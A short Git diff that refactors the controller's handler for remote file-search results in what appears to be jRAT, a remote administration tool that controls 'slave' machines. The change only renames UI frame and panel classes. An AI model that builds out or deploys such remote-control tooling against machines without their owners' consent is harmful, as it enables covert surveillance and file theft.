@@ -5,8 +5,8 @@ import java.io.DataInputStream;
 import javax.swing.ImageIcon;
 
 import se.jrat.controller.Slave;
-import se.jrat.controller.ui.frames.FrameControlPanel;
-import se.jrat.controller.ui.panels.PanelControlSearch;
+import se.jrat.controller.ui.frames.FrameRemoteFiles;
+import se.jrat.controller.ui.panels.PanelSearchFiles;
 import se.jrat.controller.utils.IconUtils;
 
 public class Packet37SearchResult extends AbstractIncomingPacket {
@@ -17,9 +17,9 @@ public class Packet37SearchResult extends AbstractIncomingPacket {
 		String name = slave.readLine();
 		boolean dir = slave.readBoolean();
 
-		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
+		FrameRemoteFiles frame = FrameRemoteFiles.INSTANCES.get(slave);
 		if (frame != null) {
-			PanelControlSearch panel = (PanelControlSearch) frame.panels.get("file searcher");
+			PanelSearchFiles panel = frame.getSearchPanel();
 			panel.getRenderer().icons.put(path, (ImageIcon) IconUtils.getFileIconFromExtension(name, dir));
 			panel.getModel().addRow(new Object[] { path, name });
 		}
